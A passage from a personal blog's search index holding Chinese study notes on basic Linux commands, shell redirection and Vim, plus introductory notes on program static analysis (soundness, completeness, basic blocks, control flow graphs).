<p>###write</p>
<blockquote>
<p>write &lt;用户名&gt; : 给在线用户名发消息，ctrl+D保存结束</p>
</blockquote>
<h3 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h3><blockquote>
<p>wall [message] : 广播信息，自己也会收到</p>
</blockquote>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><blockquote>
<p>ping -c : 指定发送次数</p>
</blockquote>
<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><blockquote>
<p>ifconfig etc0 [ip]： 给eth0配置ip地址</p>
</blockquote>
<h3 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h3><blockquote>
<p>mail [用户名]：查看，发送电子邮件</p>
</blockquote>
<h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>列出计算机用户登录信息</p>
<h3 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h3><blockquote>
<p>traceroute <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
</blockquote>
<p>显示数据包到主机之间的路径</p>
<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>查询网络状态</p>
<p>选项：</p>
<p><code>-t</code>：TCP</p>
<p><code>-u</code>：UDP</p>
<p><code>-l</code>：监听</p>
<p><code>-r</code>：路由</p>
<p><code>-n</code>：显示ip地址和端口号</p>
<p><code>-a</code>：所有，all</p>
<h1 id="软件包类别"><a href="#软件包类别" class="headerlink" title="软件包类别"></a>软件包类别</h1><ol>
<li>源码包<ol>
<li>C/C++编写，需手动安装</li>
</ol>
</li>
<li>二进制包<ol>
<li>经过编译的二进制包，不能再看见源代码</li>
<li>.rpm包：redhat，centOS</li>
<li>.ded包：debian，ubuntu</li>
</ol>
</li>
</ol>
<p>#SHELL命令</p>
<p>shell两大家族：</p>
<table>
<thead>
<tr>
<th align="center">Bourne shell</th>
<th align="left">C</th>
</tr>
</thead>
<tbody><tr>
<td align="center">sh</td>
<td align="left">csh</td>
</tr>
<tr>
<td align="center">ksh</td>
<td align="left">tcsh</td>
</tr>
<tr>
<td align="center">bash</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">psh</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">zsh</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>查看支持shell种类：<code>vim /etc/shells</code></p>
<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>输出命令</p>
<p><code>echo -e</code>：支持<code>\</code>转义         </p>
<p> <code>#! /bin/bash</code></p>
<h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><blockquote>
<p>alias 别名 = ‘原命令’</p>
</blockquote>
<p>设置命令别名</p>
<p><code>alias</code>：查询命令别名</p>
<p><code>unalias</code>：删除别名</p>
<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><blockquote>
<p>history [选项] [历史命令保存文件] </p>
</blockquote>
<p>查看历史命令</p>
<p>选项：</p>
<p><code>-c</code>：清空历史命令</p>
<p><code>-w</code>：把缓存中的历史命令写入文件</p>
<p><code>～/.bash_history</code>：历史命令</p>
<p>##tricky</p>
<p><code>Ctrl+L</code>    清屏</p>
<p><code>Ctrl+U</code>    清空光标前命令、剪切</p>
<p><code>Ctrl+K</code>    清空光标后命令</p>
<p><code>Ctrl+Y</code>    粘贴</p>
<p><code>Ctrl+R</code>    在历史命令中搜索</p>
<p><code>Ctrl+D</code>    退出当前终端</p>
<p><code>Ctrl+A</code>    光标移至开头</p>
<p><code>Ctrl+E</code>    光标移至结尾</p>
<p>##重定向</p>
<p>标准输出重定向：</p>
<blockquote>
<p>命令    &gt;    文件    ：    覆盖</p>
<p>命令    &gt;&gt;    文件  ：   追加</p>
</blockquote>
<p>不管是否报错都保存：</p>
<blockquote>
<p>覆盖：命令    &gt;    文件    2&gt;$1</p>
<p>​            命令    &amp;&gt;    文件</p>
<p>追加：命令    &gt;&gt;    文件    2&gt;$1</p>
<p>​            命令    &amp;&gt;&gt;    文件</p>
</blockquote>
<p>正确保存1，错误保存2：</p>
<blockquote>
<p>命令    &gt;&gt;    文件1    2 &gt;&gt; 文件2    </p>
</blockquote>
<p>##管道符</p>
<blockquote>
<p>命令1 | 命令2        ：命令1的<strong>正确输出</strong>作为命令2的操作对象</p>
</blockquote>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>查看所有命令</p>
<p>unset</p>
<h2 id="多命令顺序执行"><a href="#多命令顺序执行" class="headerlink" title="多命令顺序执行"></a>多命令顺序执行</h2><p><code>;</code>：多个命令之间没有任何联系，顺序执行</p>
<p><code>&amp;&amp;</code>：<strong>逻辑与</strong></p>
<p>​        当<code>cmd1</code>正确执行，<code>cmd2</code>才会执行</p>
<p>​        当<code>cmd1</code>不正确，<code>cmd2</code>不会执行</p>
<p><code>||</code>：<strong>逻辑或</strong></p>
<p>​        当<code>cmd1</code>正确执行，<code>cmd2</code>就不会执行</p>
<p>​        当<code>cmd1</code>不正确，<code>cmd2</code>才会执行</p>
<p>例子：</p>
<p>判断命令是否正确：</p>
<p><code>cmd &amp;&amp; echo yes || echo no</code></p>
<p>脚本安装：</p>
<p><code>./configure &amp;&amp; make &amp;&amp; make install</code></p>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>匹配文件名</p>
<p>具体含义：</p>
<p><code>?</code>：匹配任意一个字符，必须得有一个，不包含null</p>
<p><code>*</code>：匹配任意一个或多个任意字符，可以匹配任意内容，null也可以匹配到</p>
<p><code>[]</code>：匹配括号中的任意一个字符，必须得有一个</p>
<p><code>[-]</code>：<code>[a-z]</code>：匹配任意一个小写字母</p>
<p><code>[^]</code>：<strong>逻辑非</strong>，表示匹配不在中括号内的一个字符</p>
<p>​            <code>[^0-9]</code>：匹配一个任意一个不是0-9数字的字符</p>
<h2 id="其他特殊符号"><a href="#其他特殊符号" class="headerlink" title="其他特殊符号"></a>其他特殊符号</h2><p>单引号双引号的区别：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=sc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'$name'</span> =&gt;<span class="variable">$name</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> =&gt;sc</span><br></pre></td></tr></table></figure>

<p><code>$()</code>：用来执行系统命令</p>
<p><code>abc = $(date)</code>：将date执行，将结果赋值给abc变量的值</p>
<h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p>永远滴神</p>
<p>没有菜单，只有命令</p>
<h2 id="行号"><a href="#行号" class="headerlink" title="行号"></a>行号</h2><p><code>:set nu</code>：设置行号</p>
<p><code>:set nonu</code>：取消行号</p>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p><code>a</code>：是从目前光标所在位置的下一个位置插入</p>
<p><code>A</code>：在光标所在行尾插入</p>
<p><code>i</code>：在光标所在的当前位置插入</p>
<p><code>I</code>：在光标所在行首插入</p>
<p><code>o</code>：在光标下一行插入一行，从行首开始输入文字</p>
<p><code>O</code>；在光标上插入新行</p>
<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p><code>gg</code>：到第一行</p>
<p><code>G</code>：到最后一行</p>
<p><code>:1000</code>：到1000行</p>
<p><code>$</code>：移动光标所在行的”行尾”</p>
<p><code>0/^</code>：移至光标所在行的”行首”</p>
<p><code>w</code>：光标移至下个字的开头</p>
<p><code>e</code>：光标移至下个字的字尾</p>
<p><code>b</code>：光标移至上个字的开头</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p><code>x</code>：每按一次，删除光标所在处的字符</p>
<p><code>nx</code>：<code>6x</code>表示，删除光标后的6个字符</p>
<p><code>X</code>：每按一次，删除光标前面的一个字符</p>
<p><code>nX</code>：<code>6X</code>表示，删除光标前的6个字符</p>
<p><code>dd</code>：删除光标所在行</p>
<p><code>ndd</code>：从光标所在行开始删除n行</p>
<p><code>dG</code>：删除从光标所在行开始到文件末尾的内容</p>
<p><code>D</code>：删除光标处到行尾的内容</p>
<p><code>：n1,n2d</code>：删除<code>n1~n2</code>指定范围的行</p>
<h2 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h2><p><code>yy</code>：复制当前行</p>
<p><code>nyy</code>：<code>6yy</code>表示复制当行往下数以下6行</p>
<p><code>dd</code>：剪切当前行</p>
<p><code>ndd</code>：<code>6dd</code>表示剪切当行往下数以下6行</p>
<p><code>p</code>：粘贴在当前行下面</p>
<p><code>P</code>：粘贴在当前行上面</p>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p><code>/string</code>：搜索指定字符串</p>
<p><code>n</code>：搜索下一个出现的位置</p>
<p><code>/</code>：<code>/范围 /要替换的/替换的/g</code></p>
<h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><p><code>r</code>：进行替换当前字符模式，替换一个字符</p>
<p><code>R</code>：从光标所在处开始替换字符，可以写一堆</p>
<p><code>u</code>：撤销上一步操作</p>
<h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p><code>:w</code>：保存</p>
<p><code>:w new_file_name</code>：保存到指定路径</p>
<p><code>:wq</code>：保存并退出</p>
<p><code>:q!</code>：不保存，强制退出</p>
<p><code>:wq!</code>：强行保存</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p><code>:r filename</code>：将文件内容导入到当前Vim文件中</p>
<p><code>:r ! cmd</code>：将命令执行结果导入到当前文件之中</p>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p><code>:map ^B 2251267401@qq.com</code>：定义ctrlB为快捷键，替换个人邮箱（尖括号是用ctrl+v+B敲出来）</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux基础</tag>
      </tags>
  </entry>
  <entry>
    <title>静态分析入门笔记02</title>
    <url>/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B002/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>遥望洞庭山水翠，白银盘里一青螺。</p>
</blockquote>
<p>这篇梳理数据流分析及相关方法。</p>
<a id="more"></a>

<h1 id="数据流-Data-Flows"><a href="#数据流-Data-Flows" class="headerlink" title="数据流 Data Flows"></a>数据流 Data Flows</h1><h2 id="CFG上到底是什么在流动？"><a href="#CFG上到底是什么在流动？" class="headerlink" title="CFG上到底是什么在流动？"></a>CFG上到底是什么在流动？</h2><p>是<strong>数据流</strong>。</p>
<p>绝大部分静态分析牺牲了<strong>completeness</strong>。</p>
<p>先讲两点：</p>
<ol>
<li>对变量进行抽象表达。</li>
<li>over-approcimation：过近似。就是说无论实际函数产生了多么复杂的情况，静态分析时都应该包含每种情况。</li>
</ol>
<p><strong>may-analysis</strong>：绝大部分静态分析，最常见。</p>
<blockquote>
<p>Outputs: maybe-true , so -&gt; over-approximation.</p>
</blockquote>
<p><strong>must-analysis</strong>: 为了报出来<strong>一定</strong>是正确的，那么就必须under-approximation。</p>
<blockquote>
<p>Outputs: must be true , so -&gt; under-approximation.</p>
</blockquote>
<p>同一目标：<strong><em>safe-approximation</em></strong></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>静态分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>静态分析入门笔记01</title>
    <url>/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>男儿何不带吴钩，收取关山五十州。</p>
</blockquote>
<p>从这篇文章开始，我会在我的博客中记录学习<strong>程序静态分析</strong>的点点滴滴，我也会把在疫情期间，自己在家中学习的成果和收获上传到我的博客，记录自己的点滴进步。</p>
<a id="more"></a>

<h1 id="PL？程序分析？"><a href="#PL？程序分析？" class="headerlink" title="PL？程序分析？"></a>PL？程序分析？</h1><h2 id="PL的三大模块"><a href="#PL的三大模块" class="headerlink" title="PL的三大模块"></a>PL的三大模块</h2><p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%9001_1.jpg" alt="q"></p>
<h3 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分"></a>理论部分</h3><ol>
<li>程序是如何设计的</li>
<li>语言的类型系统</li>
<li>语言的形式语义与逻辑系统</li>
</ol>
<h3 id="支撑环境"><a href="#支撑环境" class="headerlink" title="支撑环境"></a>支撑环境</h3><ol>
<li>编译器：对语言语法的解析，字节码转换等</li>
<li>运行时系统：Java，Python等，JVM虚拟机，内存分配，管理</li>
</ol>
<h3 id="语言应用"><a href="#语言应用" class="headerlink" title="语言应用"></a>语言应用</h3><ol>
<li>程序分析</li>
<li>程序验证</li>
<li>程序合成：例如如何自动生成一个程序</li>
</ol>
<h2 id="语言核心"><a href="#语言核心" class="headerlink" title="语言核心"></a>语言核心</h2><p>核心无非分为三类：</p>
<ol>
<li><p><strong>命令式语言Imperative language</strong>：Java，C/C++等</p>
<p>把程序逻辑拆解成一条条指令，加载到内存，顺序执行下来。</p>
</li>
<li><p><strong>函数式语言Functional language</strong>：Pascal，JS，Python</p>
<p>命令式与函数式相结合，把逻辑包装起来，形式化。</p>
</li>
<li><p><strong>逻辑式语言Prolog</strong>：</p>
<p>声明，逻辑，与、或、非。</p>
</li>
</ol>
<blockquote>
<p>语言核心没有变，用语言写的程序变得复杂了。</p>
</blockquote>
<p>#静态分析</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote>
<p>在程序运行前，在编译时刻就完成程序安全性，可靠性的检验。不用运行程序本身，就能检查出程序潜在的问题。</p>
</blockquote>
<ol>
<li>程序运行时会不会有隐私泄露？</li>
<li>空指针引用异常？</li>
<li>cast安全吗？</li>
<li>v1，v2两个变量会不会造成内存竞争？要不要加锁？</li>
<li>assert运行时会不会fail掉？</li>
<li>dead code？</li>
</ol>
<h2 id="Rice’s-Theorem"><a href="#Rice’s-Theorem" class="headerlink" title="Rice’s Theorem"></a>Rice’s Theorem</h2><blockquote>
<p>程序分析不存在  <strong><em>exact answer</em></strong></p>
</blockquote>
<p>正常的递归可枚举语言，<strong>不存在</strong>某个方法，可以去判断其是否存在问题。</p>
<h2 id="Sound-amp-Complete"><a href="#Sound-amp-Complete" class="headerlink" title="Sound &amp; Complete"></a>Sound &amp; Complete</h2><blockquote>
<p>Sound &gt; Truth &gt; Complete</p>
</blockquote>
<ul>
<li><p>Sound：Overapproximate，肯定会包含Truth。</p>
<p>假如Truth就是代表有10个空指针异常，那么Sound可以有1k，1w个空指针异常，就是<strong><em>包含Truth的关系</em></strong>。</p>
</li>
<li><p>Complete：Underapproximate，一定在Truth里面。</p>
<p>上一个例子，无论Complete里面有几个空指针异常，只要存在的，就一定在Truth里面，<strong><em>是Truth子集的关系</em></strong>。</p>
</li>
</ul>
<h2 id="Useful-static-analysis"><a href="#Useful-static-analysis" class="headerlink" title="Useful static analysis"></a>Useful static analysis</h2><ul>
<li>妥协Soundness：会产生<strong>【漏报】</strong>，<strong><em>False Negatives</em></strong></li>
<li>妥协Completeness：会产生<strong>【误报】</strong>，<strong><em>False Positives</em></strong></li>
</ul>
<p>但是在绝大部分的静态分析中，绝大部分都<strong><em>【妥协Completeness】</em></strong>。</p>
<p>宁可误报，也不要漏报！</p>
<h2 id="准则"><a href="#准则" class="headerlink" title="准则"></a>准则</h2><p>在保证<strong>soundness</strong>的基础上，在<strong>【精度】</strong>和<strong>【速度】</strong>上作出权衡。</p>
<h1 id="抽象-近似"><a href="#抽象-近似" class="headerlink" title="抽象+近似"></a>抽象+近似</h1><ol>
<li>抽象：判断变量的+/—/0符号。</li>
<li>近似：在抽象的基础上进行近似。<ul>
<li>Transfer function</li>
<li>Control flows</li>
</ul>
</li>
</ol>
<p>Concrete Domain ——&gt; Abstract Domain</p>
<p>不关心是具体数值，关心变量的符号位。</p>
<p><strong>Transfer function</strong>：</p>
<p>在静态分析中，transfer fuction主要应用在于如何在程序语句的抽象值上进行运算。</p>
<p>根据你分析的程序的目标，和程序中每一个语句的语义，综合地设计分析方法。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325173724216.png" alt></p>
<p><strong>Control flows</strong>：</p>
<p>控制流，就是程序执行的流。控制流图，程序如何跳转。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325173739742.png" alt></p>
<h1 id="IR-Intermediate-representation"><a href="#IR-Intermediate-representation" class="headerlink" title="IR (Intermediate representation)"></a>IR (Intermediate representation)</h1><h2 id="Compiler-amp-Analysis"><a href="#Compiler-amp-Analysis" class="headerlink" title="Compiler &amp; Analysis"></a>Compiler &amp; Analysis</h2><ol>
<li><p>Compiler:</p>
<p>需要将人写的高级代码，<strong>【编译】</strong>成机器可以看懂的机器码。</p>
<p>在这个过程中，编译器做的工作不仅有【翻译】，还会有【检查】。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325190416693.png" alt="image-20200325190416693"></p>
</li>
<li><p>AST vs. IR:</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200325192746007.png" alt="image-20200325192746007"></p>
</li>
</ol>
<h1 id="3AC"><a href="#3AC" class="headerlink" title="3AC"></a>3AC</h1><p>3AC：三地址码。<code>a = b + c</code></p>
<h1 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h1><h2 id="Basic-Blocks"><a href="#Basic-Blocks" class="headerlink" title="Basic Blocks"></a>Basic Blocks</h2><p>最大的、连续的、3AC指令块。</p>
<p>有且只有一个入口，并且是第一行指令是入口。</p>
<p>出口也是唯一的，是最后一个指令。</p>
<h3 id="如何划分BB？"><a href="#如何划分BB？" class="headerlink" title="如何划分BB？"></a>如何划分BB？</h3><ol>
<li>首先决定BB入口在哪：<ol>
<li>程序中的第一行语句。</li>
<li>无条件跳转的目标语句也是入口。</li>
<li>紧接着条件/无条件跳转的语句也是个BB入口。</li>
</ol>
</li>
<li>有了BB入口，接下来：<ol>
<li>有了入口，那么整个BB包含入口开始的连续语句，直到下一个leader的位置。</li>
</ol>
</li>
</ol>
<h2 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h2><p>控制流图。</p>
<p>控制流图的node其实就是BB代码块。</p>
<p><img src="../images/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B001/image-20200327194043941.png" alt="image-20200327194043941"></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>静态分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Life</title>
    <url>/Life/</url>
    <content><![CDATA[<p>#Make it better.</p>
<a id="more"></a>

]]></content>
      <tags>
        <tag>new begin</tag>
      </tags>
  </entry>
</search>
